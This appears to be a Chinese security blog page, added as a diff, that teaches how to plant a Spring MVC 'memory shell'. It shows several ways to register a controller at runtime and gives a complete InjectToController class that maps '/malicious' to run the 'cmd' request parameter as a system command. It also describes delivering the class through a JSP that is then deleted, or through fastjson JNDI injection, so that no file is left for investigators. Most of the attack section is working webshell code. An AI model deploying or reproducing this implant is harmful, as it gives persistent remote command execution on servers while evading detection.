@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Controller内存马 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Controller\u5185\u5b58\u9a6c", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "Controller \u5185\u5b58\u9a6c", url: "#controller" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
+        java agent内存马
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
+        内存马
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-controller">Spring Controller内存马</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#Controller和RequestMapping">@Controller和@RequestMapping</a></li>
+<li><a href="#Controller-内存马">Controller 内存马</a><ul>
+<li><a href="#创建controller">创建controller</a></li>
+<li><a href="#写入">写入</a></li>
+<li><a href="#总结">总结</a></li>
+<li><a href="#本节参考">本节参考</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="controllerrequestmapping">@Controller和@RequestMapping</h3>
+<p>Spring 2.5 版本新增了 Spring MVC 注解功能，用于替换传统的基于 XML 的 Spring MVC 配置。</p>
+<p>需要在 xxx-servlet.xml文件中添加相关属性才能正常使用这些标签。</p>
+<pre><code class="language-纯文本">&lt;context:component-scan base-package=&quot;test.SpringMVC&quot; /&gt;  base-package指向控制器们的包名
+同时在&lt;beans&gt;标签中加入以下属性
+xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
+
+加了后看起来就像这样
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
+       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;
+
+
+    &lt;bean name=&quot;/hello&quot; class=&quot;test.SpringMVC.Hello&quot;&gt;&lt;/bean&gt;
+    &lt;bean name=&quot;/fuck&quot; class=&quot;test.SpringMVC.Fuck&quot;&gt;&lt;/bean&gt;
+    &lt;context:component-scan base-package=&quot;test.SpringMVC&quot; /&gt;
+&lt;/beans&gt;
+</code></pre>
+<pre><code class="language-纯文本">package test.SpringMVC;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestMethod;
+import org.springframework.web.servlet.ModelAndView;
+
+@Controller //标识这是一个控制器类
+public class test { 
+    @RequestMapping(value=&quot;test&quot;)  //value指定路由，除此之外还有许多属性，详见于http://c.biancheng.net/spring_mvc/controller-requestmapping.html
+    public ModelAndView testfunc(HttpServletRequest request, HttpServletResponse response) {
+        ModelAndView msv = new ModelAndView(&quot;/WEB-INF/view/fuck.jsp&quot;);
+        msv.addObject(&quot;message&quot;,&quot;test,jsut test&quot;);
+        return msv;
+    }
+
+}
+</code></pre>
+<p>运行</p>
+<p><img alt="image-20210909150027480" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210909150027480.png" title="image-20210909150027480" /></p>
+<h2 id="controller">Controller 内存马</h2>
+<p>大致就是直接在内存创一个controller来实现后门功能。</p>
+<p>我们从上面的SpringMVC介绍中知道了Controller的一种创建方式，那便是直接写控制器类到文件中，服务器运行时激活文件中控制器类。
+如果我们用这个想法去实现内存马，那大致实现步骤就是：想办法直接把恶意controller类的java文件写入到项目路径，然后等待服务器重启，然后访问恶意controller类指定的路由实现恶意操作。
+这个思路显然是很不现实的，这样既要等到服务器重启，并且我们的马以文件的形式落地了，极易被排查出。|
+那么有没有什么方法能在服务器运行时直接在其内存中创建一个controller的方法呢？</p>
+<h3 id="controller_1">创建controller</h3>
+<p><strong>获取上下文环境块</strong></p>
+<p>在创建controller时，我们通常会需要当前环境的上下文环境块（context）来达到目的。</p>
+<p>“Spring应用中可以同时有多个Context，其中只有一个Root Context，剩下的全是Child Context</p>
+<p>所有Child Context都可以访问在Root Context中定义的bean，但是Root Context无法访问Child Context中定义的bean</p>
+<p>所有的Context在创建后，都会被作为一个属性添加到了ServletContext中”</p>
+<p>获取上下文环境块的方法有这些：</p>
+<p>前两种获得RootWebApplicationContext，后两种获得Child WebApplicationContext</p>
+<pre><code class="language-纯文本">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
+
+WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
+
+WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
+
+WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+</code></pre>
+<p>"上文展示的四种获得当前代码运行时的上下文环境的方法中，推荐使用后面两种方法获得 Child WebApplicationContext。</p>
+<p>这是因为：根据习惯，在很多应用配置中注册Controller 的 component-scan 组件都配置在类似的 dispatcherServlet-servlet.xml 中，而不是全局配置文件 applicationContext.xml 中。</p>
+<p>这样就导致 RequestMappingHandlerMapping 的实例 bean 只存在于 Child WebApplicationContext 环境中，而不是 Root WebApplicationContext 中。上文也提到过，Root Context无法访问Child Context中定义的 bean，所以可能会导致 Root WebApplicationContext 获得不了 RequestMappingHandlerMapping 的实例 bean 的情况。"</p>
+<p><strong>1.在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式。</strong></p>
+<p><em>RequestMappingHandlerMapping</em> 类的registerMapping方法可以直接注册Controller.</p>
+<pre><code class="language-纯文本">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
+RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+Method method = (Class.forName(&quot;me.landgrey.SSOLogin&quot;).getDeclaredMethods())[0];
+// 3. 定义访问 controller 的 URL 地址
+PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);
+// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+// 5. 在内存中动态注册 controller
+RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+r.registerMapping(info, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance(), method);
+</code></pre>
+<p><strong>registerHandler</strong></p>
+<pre><code class="language-纯文本">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
+context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance());
+// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
+org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
+// 3. 反射获得 registerHandler Method
+java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class);
+m1.setAccessible(true);
+// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
+m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);
+</code></pre>
+<p><strong>detectHandlerMethods</strong></p>
+<pre><code class="language-纯文本">context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance());
+org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
+java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class);
+m1.setAccessible(true);
+m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);
+</code></pre>
+<h3 id="_2">写入</h3>
+<p>如何在实战中写入controller内存马呢？
+1.上传一个注册controller的JSP文件并访问，然后把JSP删了。
+2.JNDI注入，如果有fastjson等组件且有洞，就可以用这个，完全地不落地。</p>
+<p>网上嫖的代码。</p>
+<pre><code class="language-纯文本">import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.Iterator;
+import java.util.List;
+import java.util.Map;
+
+public class InjectToController {
+    // 第一个构造函数
+    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
+        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+        // 可选步骤，判断url是否存在
+        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
+        Method method = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;).getDeclaredMethod(&quot;getMappingRegistry&quot;);
+        method.setAccessible(true);
+        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
+        Field field = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;).getDeclaredField(&quot;urlLookup&quot;);
+        field.setAccessible(true);
+        Map urlLookup = (Map) field.get(mappingRegistry);
+        Iterator urlIterator = urlLookup.keySet().iterator();
+        List&lt;String&gt; urls = new ArrayList();
+        while (urlIterator.hasNext()){
+            String urlPath = (String) urlIterator.next();
+            if (&quot;/malicious&quot;.equals(urlPath)){
+                System.out.println(&quot;url已存在&quot;);
+                return;
+            }
+        }
+        // 可选步骤，判断url是否存在
+        // 2. 通过反射获得自定义 controller 中test的 Method 对象
+        Method method2 = InjectToController.class.getMethod(&quot;test&quot;);
+        // 3. 定义访问 controller 的 URL 地址
+        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/malicious&quot;);
+        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+        // 5. 在内存中动态注册 controller
+        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+        // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
+        InjectToController injectToController = new InjectToController(&quot;aaa&quot;);
+        mappingHandlerMapping.registerMapping(info, injectToController, method2);
+    }
+    // 第二个构造函数
+    public InjectToController(String aaa) {}
+  // controller指定的处理方法
+    public void test() throws  IOException{
+        // 获取request和response对象
+        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
+        // 获取cmd参数并执行命令
+        java.lang.Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+    }
+}
+</code></pre>
+<h3 id="_3">总结</h3>
+<p>获取上下文（子上下文最好，因为ROOT applicationContext不一定能获得我们想要的bean，而Childapplication可以）从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
+向RequestMappingInfo传入HTTP方法和url获取一个RequestMappingInfo对象（info）
+定义Method对象，以及任意一个实例对象，执行registerMapping函数完成注册 mappingHandlerMapping.registerMapping(info, injectToController, method2);</p>
+<h3 id="_4">本节参考</h3>
+<p><a href="https://www.anquanke.com/post/id/198886#h3-7" title="https://www.anquanke.com/post/id/198886#h3-7">https://www.anquanke.com/post/id/198886#h3-7</a></p>
+<p><a href="https://www.cnblogs.com/bitterz/p/14820898.html#11-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjndi" title="https://www.cnblogs.com/bitterz/p/14820898.html#11-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjndi">https://www.cnblogs.com/bitterz/p/14820898.html#11-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjndi</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
+        java agent内存马
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
+        内存马
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
